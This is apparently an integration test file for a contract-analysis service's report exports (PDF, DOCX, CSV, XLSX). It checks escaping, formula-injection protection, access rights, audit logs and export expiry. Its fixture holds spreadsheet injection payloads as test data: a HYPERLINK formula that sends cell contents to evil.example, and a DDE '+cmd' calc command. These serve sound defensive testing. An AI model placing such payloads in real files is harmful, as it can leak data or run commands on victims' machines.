"""Экспорт отчёта: форматы и содержимое, защита от injection, права, срок хранения."""

from __future__ import annotations

import csv
import io
import uuid
from typing import Any

import pymupdf
import pytest
from docx import Document as Docx
from openpyxl import load_workbook

from app.models.enums import UserRole
from app.models.users import User
from app.services.exports import BUILD_EXPORT_JOB, expire_exports
from app.storage import LocalStorage
from tests.analysis_helpers import (
    Doc,
    FakeLLM,
    get_analysis,
    key,
    make_document,
    make_model,
    risk,
    risks,
    run_jobs,
    start,
)
from tests.integration.conftest import ApiClient, ApiEnv

UNILATERAL = "Исполнитель вправе в одностороннем порядке изменить стоимость услуг"
HOSTILE_TITLE = '=HYPERLINK("http://evil.example/?x="&A1,"Нажми")'
HOSTILE_TEXT = (
    '<b>жирный</b><font color="red">красный</font> <a href="http://evil.example">ссылка</a> & \x07звонок'
)


@pytest.fixture
async def finished(api: ApiEnv) -> tuple[User, ApiClient, Doc, dict[str, Any]]:
    LocalStorage(api.settings.storage_dir).ensure_layout()
    user = await api.create_user(UserRole.analyst)
    client = await api.login(user)
    doc = await make_document(api, user)
    _provider, model = await make_model(api)
    fake = FakeLLM(
        {
            "chunk_risks": risks(
                risk(
                    HOSTILE_TITLE,
                    [(key(6), UNILATERAL)],
                    description=HOSTILE_TEXT,
                    recommendation="+cmd|' /C calc'!A0",
                    suggested_revision="@SUM(1+1)*cmd",
                ),
                risk(
                    "Нет условия о форс-мажоре",
                    [],
                    category="force_majeure",
                    kind="missing_clause",
                    search_scope="Просмотрены разделы 1–4",
                ),
            )
        }
    )
    created = await start(client, doc, model)
    await run_jobs(api, fake)
    analysis = await get_analysis(client, created["id"])
    assert analysis["status"] == "completed"
    return user, client, doc, analysis


async def export(
    api: ApiEnv, client: ApiClient, analysis_id: str, fmt: str
) -> tuple[dict[str, Any], bytes, Any]:
    r = await client.post(f"/api/analyses/{analysis_id}/exports", json={"format": fmt})
    assert r.status_code == 202, r.text
    created = r.json()
    assert created["status"] == "queued" and created["download_url"] is None
    assert await run_jobs(api, FakeLLM(), job_types=(BUILD_EXPORT_JOB,)) == 1
    item = (await client.get(f"/api/exports/{created['id']}")).json()
    assert item["status"] == "ready" and item["size_bytes"] > 0 and item["expires_at"]
    download = await client.get(item["download_url"])
    assert download.status_code == 200, download.text
    return item, download.content, download.headers


def pdf_text(data: bytes) -> str:
    with pymupdf.open(stream=data, filetype="pdf") as pdf:
        return "\n".join(page.get_text() for page in pdf)


async def test_pdf_report_content_and_markup_is_escaped(
    api: ApiEnv, finished: tuple[User, ApiClient, Doc, dict[str, Any]]
) -> None:
    _, client, _doc, analysis = finished
    item, data, headers = await export(api, client, analysis["id"], "pdf")
    assert data.startswith(b"%PDF-")
    assert headers["content-type"] == "application/pdf"
    assert headers["content-disposition"].startswith("attachment;")
    assert f"contract-analysis-{analysis['id'][:8]}.pdf" in headers["content-disposition"]
    assert "Тестовый" not in headers["content-disposition"]  # название договора не в имени файла
    assert headers["x-content-type-options"] == "nosniff"
    text = " ".join(pdf_text(data).split())
    for expected in (
        "Отчёт об анализе договора",
        "Тестовый договор",  # название документа
        "Версия документа: 1",
        "Сторона A",
        "ООО «Альфа» (Заказчик)",
        analysis["config_snapshot"]["model"]["display_name"],
        "односторонние изменения условий",
        "Подтверждён",
        UNILATERAL,
        "стр. 1",
        "п. 2.2",
        "Нет условия о форс-мажоре",
        "Просмотрено моделью: Просмотрены разделы 1–4",
        "не заменяет консультацию юриста",
        "Проект редакции для обсуждения",
    ):
        assert expected in text, expected
    # Разметка из текста модели выведена как текст, а не применена.
    assert "<b>жирный</b>" in text and '<a href="http://evil.example">ссылка</a>' in text
    with pymupdf.open(stream=data, filetype="pdf") as pdf:
        assert all(not page.get_links() for page in pdf)  # ссылка не стала гиперссылкой
    assert "secret" not in text.lower() and "openrouter.ai" not in text and "ollama:11434" not in text
    assert item["format"] == "pdf"


async def test_docx_report(api: ApiEnv, finished: tuple[User, ApiClient, Doc, dict[str, Any]]) -> None:
    _, client, _doc, analysis = finished
    _item, data, headers = await export(api, client, analysis["id"], "docx")
    assert headers["content-type"].startswith(
        "application/vnd.openxmlformats-officedocument.wordprocessingml"
    )
    doc = Docx(io.BytesIO(data))
    text = "\n".join(p.text for p in doc.paragraphs)
    assert "Тестовый договор" in text and UNILATERAL in text and "Сторона анализа" in text
    assert "<b>жирный</b>" in text and "\x07" not in text  # управляющий символ удалён
    assert "Нет условия о форс-мажоре" in text and "не заменяет консультацию юриста" in text


async def test_csv_and_xlsx_are_protected_from_formula_injection(
    api: ApiEnv, finished: tuple[User, ApiClient, Doc, dict[str, Any]]
) -> None:
    _, client, _doc, analysis = finished
    _item, data, headers = await export(api, client, analysis["id"], "csv")
    assert headers["content-type"].startswith("text/csv")
    assert data.startswith(b"\xef\xbb\xbf")  # UTF-8 BOM для Excel
    rows = list(csv.reader(io.StringIO(data.decode("utf-8-sig")), delimiter=";"))
    header, *body = rows
    assert header[:3] == ["ID", "Статус проверки", "Уровень"]
    col = {name: i for i, name in enumerate(header)}
    hostile = next(r for r in body if HOSTILE_TITLE in r[col["Название"]])
    assert hostile[col["Название"]] == "'" + HOSTILE_TITLE
    assert hostile[col["Рекомендация"]].startswith("'+cmd")
    assert hostile[col["Проект редакции"]].startswith("'@SUM")
    assert UNILATERAL in hostile[col["Цитаты"]]
    assert hostile[col["Страницы"]] == "1" and hostile[col["Пункты"]] == "2.2"
    assert hostile[col["Правило"]] == ""
    for row in body:
        for value in row:
            assert not value.startswith(("=", "+", "-", "@")), value

    _item, data, headers = await export(api, client, analysis["id"], "xlsx")
    assert headers["content-type"].startswith("application/vnd.openxmlformats-officedocument.spreadsheetml")
    wb = load_workbook(io.BytesIO(data))
    sheet = wb["Риски"]
    cells = [c for row in sheet.iter_rows() for c in row if c.value is not None]
    assert all(c.data_type == "s" for c in cells)
    assert any(c.value == "'" + HOSTILE_TITLE for c in cells)
    assert not any(str(c.value).startswith(("=", "+", "-", "@")) for c in cells)
    info = [str(c.value) for row in wb["Отчёт"].iter_rows() for c in row if c.value]
    assert "Тестовый договор" in info and any("не заменяет" in v for v in info)


async def test_export_permissions_and_audit(
    api: ApiEnv, finished: tuple[User, ApiClient, Doc, dict[str, Any]]
) -> None:
    owner, client, doc, analysis = finished
    item, _data, _headers = await export(api, client, analysis["id"], "csv")
    stranger = await api.create_user(UserRole.analyst)
    stranger_client = await api.login(stranger)
    for method, url in (
        ("post", f"/api/analyses/{analysis['id']}/exports"),
        ("get", f"/api/analyses/{analysis['id']}/exports"),
        ("get", f"/api/exports/{item['id']}"),
        ("get", f"/api/exports/{item['id']}/download"),
        ("get", f"/api/exports/{uuid.uuid4()}/download"),
    ):
        kwargs: dict[str, Any] = {"json": {"format": "pdf"}} if method == "post" else {}
        r = await getattr(stranger_client, method)(url, **kwargs)
        assert r.status_code == 404, (url, r.text)
    # Viewer с доступом view может экспортировать и скачивать.
    viewer = await api.create_user(UserRole.viewer)
    viewer_client = await api.login(viewer)
    r = await client.put(
        f"/api/documents/{doc.document_id}/access", json={"email": viewer.email, "permission": "view"}
    )
    assert r.status_code in (200, 201)
    listing = (await viewer_client.get(f"/api/analyses/{analysis['id']}/exports")).json()["items"]
    assert [e["id"] for e in listing] == [item["id"]]
    assert (await viewer_client.get(item["download_url"])).status_code == 200
    _vitem, vdata, _h = await export(api, viewer_client, analysis["id"], "pdf")
    assert vdata.startswith(b"%PDF-")
    actions = await api.rows(
        "SELECT action, actor_user_id FROM audit_log WHERE action LIKE 'export.%' ORDER BY id"
    )
    assert [a[0] for a in actions] == [
        "export.created",
        "export.downloaded",
        "export.downloaded",
        "export.created",
        "export.downloaded",
    ]
    assert actions[0][1] == owner.id
    # Неверный формат и анализ в работе.
    assert (
        await client.post(f"/api/analyses/{analysis['id']}/exports", json={"format": "html"})
    ).status_code == 422


async def test_export_requires_finished_analysis(api: ApiEnv) -> None:
    user = await api.create_user(UserRole.analyst)
    client = await api.login(user)
    doc = await make_document(api, user)
    _provider, model = await make_model(api)
    created = await start(client, doc, model)
    r = await client.post(f"/api/analyses/{created['id']}/exports", json={"format": "pdf"})
    assert r.status_code == 409 and r.json()["error"]["code"] == "analysis_not_finished"


async def test_not_ready_and_expired_export(
    api: ApiEnv, finished: tuple[User, ApiClient, Doc, dict[str, Any]]
) -> None:
    _, client, _doc, analysis = finished
    r = await client.post(f"/api/analyses/{analysis['id']}/exports", json={"format": "pdf"})
    pending = r.json()
    r = await client.get(f"/api/exports/{pending['id']}/download")
    assert r.status_code == 409 and r.json()["error"]["code"] == "export_not_ready"
    await run_jobs(api, FakeLLM(), job_types=(BUILD_EXPORT_JOB,))
    storage = LocalStorage(api.settings.storage_dir)
    file_key = await api.scalar("SELECT storage_key FROM exports WHERE id = :i", i=uuid.UUID(pending["id"]))
    assert storage.exists(file_key)
    await api.execute("UPDATE exports SET expires_at = now() - interval '1 minute'")
    r = await client.get(f"/api/exports/{pending['id']}/download")
    assert r.status_code == 410 and r.json()["error"]["code"] == "export_expired"
    assert await expire_exports(api.factory, storage) == 1
    assert not storage.exists(file_key)
    assert (await client.get(f"/api/exports/{pending['id']}")).json()["status"] == "expired"


async def test_pending_exports_limit(
    api: ApiEnv, finished: tuple[User, ApiClient, Doc, dict[str, Any]]
) -> None:
    _, client, _doc, analysis = finished
    api.settings.max_pending_exports_per_user = 1
    assert (
        await client.post(f"/api/analyses/{analysis['id']}/exports", json={"format": "pdf"})
    ).status_code == 202
    r = await client.post(f"/api/analyses/{analysis['id']}/exports", json={"format": "pdf"})
    assert r.status_code == 429 and r.json()["error"]["code"] == "too_many_pending_exports"


async def test_system_settings_admin_only(api: ApiEnv) -> None:
    admin = await api.create_user(UserRole.admin)
    r = await (await api.login(admin)).get("/api/admin/system-settings")
    assert r.status_code == 200
    groups = r.json()["groups"]
    assert {p["key"] for p in groups["analysis"]} >= {"analysis_max_tokens", "analysis_max_active_per_user"}
    assert "secret" not in r.text.lower() and "database_url" not in r.text.lower()
    analyst = await api.create_user(UserRole.analyst)
    assert (await (await api.login(analyst)).get("/api/admin/system-settings")).status_code == 403
